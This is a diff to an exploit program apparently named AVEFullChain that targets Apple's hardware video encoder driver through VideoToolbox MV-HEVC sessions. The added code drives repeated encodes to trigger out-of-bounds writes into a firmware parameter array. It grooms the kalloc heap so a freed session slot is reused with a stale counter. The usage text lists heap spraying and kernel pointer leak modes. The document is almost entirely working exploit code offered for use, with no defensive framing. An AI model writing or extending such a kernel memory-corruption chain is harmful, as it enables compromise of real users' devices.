@@ -1168,6 +1168,137 @@ tc_done:
         rlog("If stale counter detected: skip crash_test, exploit directly.\n");
         rlog("If memory zeroed: session reuse trick not viable.\n");
 
+    } else if (strcmp(mode, "safe_corrupt") == 0) {
+        rlog("SAFE_CORRUPT: Target +0x5C34 within safe window (196 encodes)\n");
+        rlog("Entry 588 at byte 4 = layer_id field (secondary param array param[0])\n");
+        rlog("This is the ONLY driver-referenced field reachable without crash.\n\n");
+
+        if (phase1_verify() != 0) goto done;
+
+        int sc_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0xFFFF;
+        int sc_enc = (argc > 3) ? atoi(argv[3]) : 196;
+        if (sc_enc > 197) { rlog("CLAMPED to 197 (crash boundary)\n"); sc_enc = 197; }
+        rlog("layer_id=0x%x, encodes=%d\n\n", sc_lid, sc_enc);
+
+        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, sc_lid);
+        if (!s) { rlog("FAILED: encoder creation\n"); goto done; }
+
+        /* Encode to safe limit — entry 588 reached at ~196 encodes */
+        for (int i = 0; i < sc_enc; i++) {
+            int st = encode_one(s, i, 128, 128);
+            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
+            if ((i+1) == sc_enc || (i+1) % 50 == 0)
+                rlog("[%d/%d] ok, ~%d entries, psets=%zu bytes=%zu\n",
+                     i+1, sc_enc, (i+1)*3, g_last_pset_count, g_last_pset_total_bytes);
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        usleep(200000);
+
+        rlog("\n--- Safe corruption applied ---\n");
+        rlog("Entry 588 (+0x5C34) now contains layer_id=0x%x at byte 4\n", sc_lid);
+        rlog("Secondary param array param[0] corrupted; params[1-6] intact.\n");
+        rlog("If device is still alive: safe_corrupt is SURVIVABLE.\n");
+        rlog("Next: encode 1 more frame to observe firmware behavior with corrupted param.\n\n");
+
+        /* One more encode to trigger firmware param read with corrupted value */
+        rlog("--- Extra encode (firmware reads corrupted +0x5C34) ---\n");
+        int st = encode_one(s, sc_enc, 128, 128);
+        rlog("Extra encode: status=%d\n", st);
+        if (st == 0) {
+            rlog("SURVIVED: firmware tolerates corrupted param[0]\n");
+            rlog("Encode 2 more to confirm stability...\n");
+            for (int i = 1; i <= 2; i++) {
+                st = encode_one(s, sc_enc+i, 128, 128);
+                rlog("  +%d: status=%d psets=%zu\n", i, st, g_last_pset_count);
+                if (st != 0) break;
+            }
+        } else {
+            rlog("CRASH/ERROR: firmware param corruption triggers fault at +0x5C34\n");
+        }
+
+        VTCompressionSessionInvalidate(s); CFRelease(s);
+
+    } else if (strcmp(mode, "session_reuse_groom") == 0) {
+        rlog("SESSION_REUSE_GROOM: Enhanced stale counter with heap grooming\n");
+        rlog("Strategy: allocate N dummy sessions, free target, allocate reuse.\n");
+        rlog("Goal: increase probability of LIFO slot reuse in kalloc.49152.\n\n");
+
+        if (phase1_verify() != 0) goto done;
+
+        int sr_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 2;
+        int sr_dummies = (argc > 3) ? atoi(argv[3]) : 3;
+        rlog("layer_id=0x%x, dummy_sessions=%d\n\n", sr_lid, sr_dummies);
+
+        /* Step 1: Create dummy sessions to fill kalloc.49152 free list */
+        rlog("--- Step 1: Create %d dummy sessions (fill free list) ---\n", sr_dummies);
+        VTCompressionSessionRef dummies[8];
+        int n_dummies = (sr_dummies > 8) ? 8 : sr_dummies;
+        for (int i = 0; i < n_dummies; i++) {
+            dummies[i] = create_mvhevc_encoder(128, 128, 1);
+            if (!dummies[i]) { rlog("Dummy %d: FAILED\n", i); n_dummies = i; break; }
+            rlog("Dummy %d: created\n", i);
+        }
+
+        /* Step 2: Create target session and inflate counter */
+        rlog("\n--- Step 2: Target session (196 encodes to inflate counter) ---\n");
+        VTCompressionSessionRef target = create_mvhevc_encoder(128, 128, sr_lid);
+        if (!target) { rlog("FAILED: target encoder creation\n"); goto cleanup_dummies; }
+
+        for (int i = 0; i < 196; i++) {
+            int st = encode_one(target, i, 128, 128);
+            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
+            if ((i+1) % 50 == 0) rlog("[%d/196] ok\n", i+1);
+        }
+        VTCompressionSessionCompleteFrames(target, kCMTimeInvalid);
+        usleep(200000);
+        rlog("Target counter inflated to ~588\n");
+
+        /* Step 3: Free target — its kalloc.49152 slot goes to free list (LIFO) */
+        rlog("\n--- Step 3: Free target (most recent free → LIFO head) ---\n");
+        VTCompressionSessionInvalidate(target); CFRelease(target);
+        usleep(50000);
+
+        /* Step 4: Create reuse session — should get the just-freed slot */
+        rlog("\n--- Step 4: Create reuse session (should get stale slot) ---\n");
+        VTCompressionSessionRef reuse = create_mvhevc_encoder(128, 128, sr_lid);
+        if (!reuse) { rlog("FAILED: reuse encoder creation\n"); goto cleanup_dummies; }
+
+        /* Step 5: Encode 1 frame and check for stale counter */
+        g_last_pset_count = 0;
+        g_last_pset_total_bytes = 0;
+        int st = encode_one(reuse, 0, 128, 128);
+        rlog("Reuse encode 1: status=%d, pset_count=%zu, pset_bytes=%zu\n",
+             st, g_last_pset_count, g_last_pset_total_bytes);
+
+        if (g_last_pset_count > 10) {
+            rlog("\n*** STALE COUNTER DETECTED: pset_count=%zu >> 3 ***\n",
+                 g_last_pset_count);
+            rlog("*** HEAP GROOMING WORKED: kalloc_data reuse confirmed ***\n");
+            rlog("*** Counter starts at ~588 → first encode hits crash zone ***\n");
+            rlog("*** With lid=%d, +0x5F94 dispatch reachable in ~18 encodes ***\n", sr_lid);
+        } else {
+            rlog("Normal counter (memory zeroed or different slot). psets=%zu\n",
+                 g_last_pset_count);
+        }
+
+        /* Encode a few more to observe */
+        for (int i = 1; i <= 5; i++) {
+            st = encode_one(reuse, i, 128, 128);
+            rlog("  +%d: status=%d psets=%zu\n", i, st, g_last_pset_count);
+            if (st != 0) break;
+        }
+
+        VTCompressionSessionInvalidate(reuse); CFRelease(reuse);
+
+cleanup_dummies:
+        rlog("\n--- Cleanup: freeing dummy sessions ---\n");
+        for (int i = 0; i < n_dummies; i++) {
+            if (dummies[i]) {
+                VTCompressionSessionInvalidate(dummies[i]);
+                CFRelease(dummies[i]);
+            }
+        }
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -1189,6 +1320,8 @@ tc_done:
         rlog("  dual             -- Multi-session spray + cross-buffer + victim trigger\n");
         rlog("  pset_dump [enc]  -- Dump raw parameter set bytes for kernel pointer leak\n");
         rlog("  session_reuse [lid] [rounds] -- Test kalloc_data stale counter reuse\n");
+        rlog("  safe_corrupt [lid] [enc]     -- Safe-window +0x5C34 corruption (max 197 enc)\n");
+        rlog("  session_reuse_groom [lid] [dummies] -- Stale counter with heap grooming\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
         rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
